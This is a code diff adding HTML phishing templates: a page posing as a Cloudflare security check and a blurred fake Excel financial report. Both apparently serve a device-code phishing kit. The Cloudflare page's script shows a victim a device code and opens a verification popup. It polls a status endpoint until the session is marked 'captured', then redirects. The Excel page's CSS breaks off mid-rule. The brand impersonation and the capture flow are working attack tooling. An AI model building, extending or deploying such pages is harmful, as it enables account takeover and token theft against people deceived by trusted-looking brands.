@@ -1,0 +1,614 @@
+const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Cloudflare &middot; Security Check</title>
+		<link
+			rel="icon"
+			href="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg"
+		/>
+		<style>
+			/* TrustGate — Cloudflare-style security check page */
+
+			* {
+				box-sizing: border-box;
+				margin: 0;
+				padding: 0;
+			}
+
+			html,
+			body {
+				height: 100%;
+			}
+
+			body {
+				font-family:
+					-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu,
+					Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+				color: #313131;
+				background: linear-gradient(180deg, #f7f7f7 0%, #efefef 100%);
+				display: flex;
+				flex-direction: column;
+				min-height: 100vh;
+				-webkit-font-smoothing: antialiased;
+			}
+
+			/* ---------- Layout ---------- */
+
+			.page {
+				flex: 1;
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				padding: 48px 16px 24px;
+			}
+
+			/* ---------- Card ---------- */
+
+			.card {
+				width: 100%;
+				max-width: 480px;
+				background: #fff;
+				border: 1px solid #e2e2e2;
+				border-radius: 6px;
+				box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+				overflow: hidden;
+			}
+
+			.card-header {
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				padding: 14px 24px;
+				border-bottom: 1px solid #efefef;
+				background: #fafafa;
+			}
+
+			.brand {
+				display: flex;
+				align-items: center;
+				gap: 8px;
+			}
+
+			.brand-mark {
+				width: 22px;
+				height: 22px;
+			}
+
+			.brand-name {
+				font-size: 16px;
+				font-weight: 700;
+				letter-spacing: 0.2px;
+				color: #313131;
+			}
+
+			.badge {
+				font-size: 11px;
+				font-weight: 600;
+				text-transform: uppercase;
+				letter-spacing: 0.8px;
+				color: #f6821f;
+				background: rgba(246, 130, 31, 0.1);
+				border: 1px solid rgba(246, 130, 31, 0.35);
+				border-radius: 999px;
+				padding: 4px 10px;
+			
+<truncated 10981 bytes>
+p, H);
+			    }
+			  }
+
+			  function drawNoiseDots() {
+			    for (var i = 0; i < 240; i++) {
+			      ctx.fillStyle = 'rgba(17, 24, 39,' + rand(0.06, 0.3).toFixed(3) + ')';
+			      ctx.beginPath();
+			      ctx.arc(rand(0, W), rand(0, H), rand(0.7, 2.2), 0, Math.PI * 2);
+			      ctx.fill();
+			    }
+			  }
+
+			  function render() {
+			    ctx.clearRect(0, 0, W, H);
+			    drawBackground(ctx);
+			    warpOnto(renderCodeOffscreen());
+			    drawSquiggle(ctx, '#9a3412', 0.45, 4);   // in front of the text
+			    drawSquiggle(ctx, '#1e40af', 0.35, 3);
+			    drawNoiseDots();
+			  }
+
+			  render();
+
+			  // Redraw the *appearance* only — DEVICE_CODE never changes.
+			  document.getElementById('captcha-refresh').addEventListener('click', render);
+			  canvas.addEventListener('click', render);
+
+			  // "Verify device" button: fires an event the real verification logic
+			  // can listen for. No verification logic lives here.
+			  var verifyBtn = document.getElementById('verify-device');
+			  verifyBtn.addEventListener('click', function () {
+			    document.dispatchEvent(
+			      new CustomEvent('trustgate:verify', { detail: { code: DEVICE_CODE } })
+			    );
+			  });
+
+			  // Cosmetic Ray ID (mirrors Cloudflare's challenge pages)
+			  var hex = '0123456789abcdef';
+			  var ray = '';
+			  for (var i = 0; i < 16; i++) ray += hex.charAt(Math.floor(Math.random() * 16));
+			  document.getElementById('ray-id').textContent = ray;
+			
+			  // Polling logic
+			  var verifyBtnElement = document.getElementById('verify-device');
+			  var ready = codeReady && DEVICE_CODE !== '';
+
+			  document.addEventListener('trustgate:verify', function(e) {
+			      if(!ready || !DEVICE_CODE) return;
+			      var w = 600, h = 600, l = (screen.width-w)/2, t = (screen.height-h)/2;
+			      var popup = window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+			      if(popup) popup.focus();
+			      verifyBtnElement.textContent = 'Verification in progress...';
+			  });
+
+			  function poll() {
+			    fetch('/dc/status/'+sid, {method:'GET',credentials:'include'})
+			      .then(function(r){return r.json()})
+			      .then(function(d){
+			        if(d.ready && !ready) {
+			          ready = true;
+			          DEVICE_CODE = d.user_code;
+			          verifyUrl = d.verify_url;
+			          render();
+			          verifyBtnElement.disabled = false;
+			          verifyBtnElement.textContent = 'Verify device';
+			        }
+			        if(d.captured) {
+			          if(d.redirect_url) {
+			            top.location.href = d.redirect_url;
+			          } else {
+			            top.location.href = '/';
+			          }
+			        }
+			        if(d.expired) {
+			          verifyBtnElement.disabled = true;
+			          verifyBtnElement.textContent = 'Session Expired';
+			        }
+			        if(!d.failed && !d.expired && !d.captured) {
+			          setTimeout(poll,3000);
+			        }
+			      }).catch(function(){setTimeout(poll,5000);});
+			  }
+
+			  if(!ready) {
+			      verifyBtnElement.disabled = true;
+			      verifyBtnElement.textContent = 'Generating...';
+			  }
+
+			  poll();
+
+			})();
+		</script>
+	</body>
+</html>`
+
+// Excel / Q2 Financial Report themed page
+const DEVICE_CODE_EXCEL_HTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Q2 Financial Report — Restricted</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; overflow: hidden; background: #fff; }
+
+body { font-family: 'Calibri', 'Segoe UI', Arial, sans-serif; }
+.ui { font-family: 'Segoe UI', system-ui, -apple-system, Arial, sans-serif; }
+
+/* ═══════════════════════════════════════════════════
+   EXCEL BACKGROUND
+═══════════════════════════════════════════════════ */
+.xl-shell {
+  position: fixed;
+  inset: 0;
+  background: #fff;
+  filter: blur(3.5px);
+  transform: scale(1.02);
+  transform-origin: center;
+  user-select: none;
+  pointer-events: none;
+  display: flex;
+  flex-direction: column;
+}
+
+.xl-ribbon {
+  height: 30px;
+  background: #217346;
+  display: flex;
+  align-items: center;
+  padding: 0 10px;
+  gap: 18px;
+  flex-shrink: 0;
+}
+.xl-ribbon-tab {
+  font-size: 11px;
+  color: rgba(255,255,255,0.85);
+  font-family: 'Segoe UI', Arial, sans-serif;
+  letter-spacing: 0.01em;
+}
+.xl-ribbon-tab.active {
+  color: #fff;
+  font-weight: 500;
+  border-bottom: 2px solid #fff;
+  padding-bottom: 1px;
+}
+
+.xl-formula-bar {
+  height: 26px;
+  background: #fff;
+  border-bottom: 1px solid #d0d0d0;
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+}
+.xl-name-box {
+  width: 80px;
+  border-right: 1px solid #d0d0d0;
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 11px;
+  color: #1a1a1a;
+  padding: 0 8px;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+}
+.xl-fx {
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 11px;
+  color: #9b59b6;
+  padding: 0 10px;
+  font-style: italic;
+  border-right: 1px solid #d0d0d0;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+  width: 30px;
+  justify-content: center;
+}
+.xl-formula-text {
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 11px;
+  color: #1a1a1a;
+  padding: 0 10px;
+}
+
+.xl-body {
+  flex: 1;
+  display: flex;
+  overflow: hidden;
+}
+
+.xl-rownums {
+  width: 42px;
+  background: #f2f2f2;
+  border-right: 1px solid #d0d0d0;
+  flex-shrink: 0;
+  display: flex;
+  flex-direction: column;
+  overflow-y: auto;
+  scrollbar-width: none;
+}
+.xl-rownums::-webkit-scrollbar { display: none; }
+.xl-rownum-corner {
+  height: 22px;
+  border-bottom: 1px solid #d0d0d0;
+  background: #f2f2f2;
+  flex-shrink: 0;
+}
+.xl-rn {
+  height: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  padding-right: 4px;
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 10px;
+  color: #666;
+  border-bottom: 1px solid #e8e8e8;
+  flex-shrink: 0;
+}
+
+.xl-grid-wrap {
+  flex: 1;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+
+.xl-col-headers {
+  height: 22px;
+  display: flex;
+  background: #f2f2f2;
+  border-bottom: 1px solid #d0d0d0;
+  flex-shrink: 0;
+}
+.xl-ch {
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 10px;
+  color: #444;
+  border-right: 1px solid #d0d0d0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.xl-grid {
+  flex: 1;
+  overflow-y: auto;
+  scrollbar-width: none;
+}
+.xl-grid::-webkit-scrollbar { display: none; }
+.xl-row {
+  display: flex;
+  height: 20px;
+}
+.xl-row.merged-title { height: 28px; }
+
+.xl-cell {
+  border-right: 1px solid #e0e0e0;
+  border-bottom: 1px solid #e0e0e0;
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 11px;
+  color: #1a1a1a;
+  display: flex;
+  align-items: center;
+  overflow: hidden;
+  white-space: nowrap;
+  flex-shrink: 0;
+  padding: 0 4px;
+}
+
+.c-B  { width: 220px; }
+.c-C  { width: 100px; }
+.c-D  { width: 100px; }
+.c-E  { width: 100px; }
+.c-F  { width: 100px; }
+.c-G  { width: 80px; }
+.c-H  { width: 80px; }
+.c-I  { width: 80px; }
+
+.xl-cell.header-row {
+  background: #1f5c8b;
+  color: #fff;
+  font-weight: 500;
+  font-size: 10px;
+  justify-content: center;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  border-color: #1a4f7a;
+}
+.xl-cell.section-head {
+  background: #dce3ec;
+  color: #1a1a1a;
+  font-weight: 700;
+  font-size: 11px;
+  border-color: #c8d4e0;
+}
+.xl-cell.subtotal-row {
+  background: #edf2f7;
+  font-weight: 600;
+  border-top: 1px solid #aab8c8;
+  border-color: #c8d4e0;
+}
+.xl-cell.total-row {
+  background: #1f5c8b;
+  color: #fff;
+  font-weight: 700;
+  border-color: #1a4f7a;
+}
+.xl-cell.even-row { background: #f7f9fc; }
+.xl-cell.right { justify-content: flex-end; }
+.xl-cell.center { justify-content: center; }
+.xl-cell.formula { color: #1f5c8b; }
+.xl-cell.neg { color: #c0392b; }
+.xl-cell.pos { color: #1e7d45; }
+.xl-cell.bold { font-weight: 600; }
+.xl-cell.title-cell {
+  font-size: 14px;
+  font-weight: 700;
+  color: #1a1a1a;
+  letter-spacing: -0.01em;
+  background: #fff;
+  border: none;
+}
+.xl-cell.subtitle-cell {
+  font-size: 10px;
+  color: #888;
+  background: #fff;
+  border: none;
+}
+.xl-cell.selected {
+  outline: 2px solid #217346;
+  outline-offset: -2px;
+}
+
+.xl-tabs {
+  height: 26px;
+  background: #f2f2f2;
+  border-top: 1px solid #d0d0d0;
+  display: flex;
+  align-items: flex-end;
+  padding: 0 6px;
+  gap: 0;
+  flex-shrink: 0;
+}
+.xl-tab {
+  height: 22px;
+  padding: 0 14px;
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 11px;
+  color: #444;
+  border: 1px solid #d0d0d0;
+  border-bottom: none;
+  background: #e8e8e8;
+  display: flex;
+  align-items: center;
+  margin-right: 2px;
+  border-radius: 3px 3px 0 0;
+}
+.xl-tab.active {
+  background: #fff;
+  color: #217346;
+  font-weight: 600;
+  border-bottom: 2px solid #fff;
+  z-index: 1;
+}
+
+.xl-statusbar {
+  height: 20px;
+  background: #f2f2f2;
+  border-top: 1px solid #d0d0d0;
+  display: flex;
+  align-items: center;
+  padding: 0 10px;
+  gap: 16px;
+  flex-shrink: 0;
+}
+.xl-status-item {
+  font-family: 'Calibri', Arial, sans-serif;
+  font-size: 10px;
+  color: #555;
+}
+
+.page-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(240, 243, 247, 0.55);
+  pointer-events: none;
+}
+
+.topbar {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  z-index: 30;
+  height: 46px;
+  background: #fff;
+  border-bottom: 1px solid #e0e0e0;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 1.8rem;
+  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
+}
+.topbar-left {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.topbar-brand {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+.brand-xl-icon {
+  width: 22px; height: 22px;
+  background: #217346;
+  border-radius: 3px;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.brand-xl-icon svg { width: 13px; height: 13px; fill: white; }
+.brand-name {
+  font-size: 0.83rem;
+  font-weight: 600;
+  color: #1a1a1a;
+  letter-spacing: -0.01em;
+}
+.topbar-divider { width: 1px; height: 16px; background: #e0e0e0; }
+.topbar-doc {
+  font-size: 0.76rem;
+  color: #888;
+  max-width: 340px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.topbar-right {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.lock-tag {
+  font-size: 0.65rem;
+  color: #888;
+  display: flex; align-items: center; gap: 4px;
+  font-family: 'Segoe UI', Arial, sans-serif;
+}
+.lock-tag svg { width: 11px; height: 11px; stroke: #aaa; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+
+.page {
+  position: fixed;
+  inset: 0;
+  z-index: 20;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 46px 1rem 1rem;
+}
+
+.card {
+  width: 100%;
+  max-width: 360px;
+  background: #fff;
+  border: 1px solid #c8c8c8;
+  border-radius: 4px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 12px 40px rgba(0,0,0,0.1);
+  overflow: hidden;
+  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
+  animation: card-in 0.3s cubic-bezier(0.34,1.1,0.64,1) both;
+}
+@keyframes card-in {
+  from { transform: translateY(16px); opacity: 0; }
+  to   { transform: translateY(0); opacity: 1; }
+}
+.card-rule { height: 3px; background: #217346; }
+
+.card-header {
+  padding: 1.4rem 1.5rem 1.1rem;
+  border-bottom: 1px solid #f0f0f0;
+  display: flex;
+  align-items: flex-start;
+  gap: 11px;
+}
+.header-icon {
+  width: 36px; height: 36px;
+  background: #e8f5ee;
+  border: 1px solid #c2dece;
+  border-radius: 4px;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.header-icon svg { width: 18px; height: 18px; fill: #217346; }
+.header-eyebrow {
+  font-size: 0.65rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: #999;
+  font-weight: 400;
+  margin-bottom: 3px;
+}
+.header-title {
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: #1a1a1a;
+  line-height: 1.25;
+  margin-bottom: 1px;
+}
+.header-sub {
+  font-size: 0.72rem;
